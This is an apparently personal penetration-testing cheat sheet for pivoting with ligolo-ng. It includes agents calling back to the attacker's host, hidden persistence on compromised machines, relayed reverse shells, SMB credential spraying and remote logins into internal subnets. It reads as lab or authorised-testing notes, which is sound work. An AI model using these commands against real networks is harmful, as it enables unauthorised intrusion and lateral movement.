# Pivoting with ligolo-ng

## The proxy on Kali
At the pwn-broker prompt:
tool install ligolo-ng
sudo /opt/pwn-broker/bin/ligolo-proxy -selfcert
- [ ] The full path, as tool install prints it: a bare sudo ligolo-proxy runs Kali's own copy
- [ ] The pivot can reach <LHOST> on 11601, where the proxy listens
In the proxy console, one interface per tunnel:
interface_create --name ligolo

## The agent on the pivot
At the pwn-broker prompt, for the line that fetches it:
serve
serve files agent
On a Linux pivot:
chmod +x agent
./agent -connect <LHOST>:11601 -ignore-cert
On a Windows pivot:
.\agent.exe -connect <LHOST>:11601 -ignore-cert
- [ ] The proxy prints Agent joined
- [ ] Agent and proxy are the same version: pwn-shop's agent with pwn-shop's proxy
To keep it running after my shell closes, on Linux, then on Windows:
nohup ./agent -connect <LHOST>:11601 -ignore-cert >/dev/null 2>&1 &
Start-Process -WindowStyle Hidden .\agent.exe -ArgumentList '-connect <LHOST>:11601 -ignore-cert'

## The tunnel and the route
In the proxy console, pick the agent and read its interfaces:
session
ifconfig
- [ ] The pivot's interface on <Subnet>/<CIDR> found, and its address noted as <PivotInternalIP>
tunnel_start --tun ligolo
route_add --name ligolo --route <Subnet>/<CIDR>
Or, in place of those two lines, one that asks which interface and networks to use:
autoroute
On Kali, to check:
ip route | grep ligolo
- [ ] The route does not overlap my VPN's network, or the VPN drops

## Work through it
At the pwn-broker prompt: tool install netexec.
No proxychains: tools reach the hosts by IP. The agent sends no raw packets, so connect scans only.
nmap -sT -Pn --top-ports 100 <InternalIP>
nxc smb <Subnet>/<CIDR>
nxc smb <Subnet>/<CIDR> -u '<Username>' -p '<Password>'
evil-winrm -i <InternalIP> -u '<Username>' -p '<Password>'
xfreerdp3 /v:<InternalIP> /u:'<Username>' /p:'<Password>' /cert:ignore
- [ ] Ping works through it, but nmap's host discovery does not: -Pn every time

## The pivot's own localhost
ligolo-ng maps 240.0.0.1 to the agent's 127.0.0.1. In the proxy console:
route_add --name ligolo --route 240.0.0.1/32
Then on Kali:
nmap -sT -Pn -p- 240.0.0.1

## Shells and downloads back through the pivot
Internal hosts cannot reach me, so a listener on the agent relays to Kali. In the agent's session:
listener_add --addr 0.0.0.0:<LPORT> --to 127.0.0.1:<LPORT> --tcp
rlwrap nc -lvnp <LPORT>
- [ ] The payload goes to <PivotInternalIP> on <LPORT>: :Pb shells
For files, a listener to serve's port, which is 80 as root and 8000 otherwise:
listener_add --addr 0.0.0.0:8080 --to <LHOST>:80 --tcp
- [ ] The line serve files prints, with <LHOST> changed to <PivotInternalIP>:8080
listener_list
- [ ] A Windows pivot's firewall lets the listener's port in: the rule in :Pb port-forwarding

## A second pivot
A host on <Subnet>/<CIDR> with a second network, THE-SECOND-NETWORK. In the first agent's session, a listener for the next agent:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
The agent fetched to the second pivot through the listener above, then pointed at the first pivot:
./agent -connect <PivotInternalIP>:11601 -ignore-cert
.\agent.exe -connect <PivotInternalIP>:11601 -ignore-cert
In the proxy console, a second interface for the new agent:
interface_create --name ligolo2
session
tunnel_start --tun ligolo2
route_add --name ligolo2 --route THE-SECOND-NETWORK

## When it does not work
- [ ] certificate signed by unknown authority: -ignore-cert missing on the agent
- [ ] Tunnel up and nothing answers: the route is missing from ip route
- [ ] RTNETLINK answers: File exists: the route is there already
- [ ] a tunnel is already using this interface: a new interface, as ligolo2
- [ ] A reverse shell never arrives: the payload aims at the pivot's internal address and the listener's port
Large transfers stall: a smaller MTU.
sudo ip link set dev ligolo mtu 1300

## Afterwards
sudo ip route del <Subnet>/<CIDR> dev ligolo
sudo ip link delete ligolo
- [ ] The agent stopped on each pivot and its file removed
